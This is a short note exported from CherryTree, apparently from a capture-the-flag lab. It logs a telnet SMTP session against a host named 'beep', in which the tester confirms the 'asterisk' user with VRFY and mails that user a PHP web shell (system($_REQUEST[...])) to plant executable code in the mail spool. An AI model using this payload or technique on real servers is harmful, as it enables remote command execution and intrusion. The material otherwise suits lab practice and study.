@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>connect</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>connect</h1><br/>root@kali:~# telnet 10.10.10.7 25<br />Trying 10.10.10.7...<br />Connected to 10.10.10.7.<br />Escape character is &#39;^]&#39;.<br />220 beep.localdomain ESMTP Postfix<br />EHLO coolhandsquid.au<br />250-beep.localdomain<br />250-PIPELINING<br />250-SIZE 10240000<br />250-VRFY<br />250-ETRN<br />250-ENHANCEDSTATUSCODES<br />250-8BITMIME<br />250 DSN<br />VRFY asterisk@localhost  <br />252 2.0.0 asterisk@localhost<br />mail from:coolhandsquid@step-child.au<br />250 2.1.0 Ok<br />rcpt to:asterisk@localhost<br />250 2.1.5 Ok<br />data<br />354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br />Subject: You got owned<br />&lt;?php echo system($_REQUEST[&#39;squid&#39;]); ?&gt;<br /><br />.<br />250 2.0.0 Ok: queued as 84C50D92F8<br />^C<br />^]<br />telnet&gt; quit<br />Connection closed.</div></body></html>
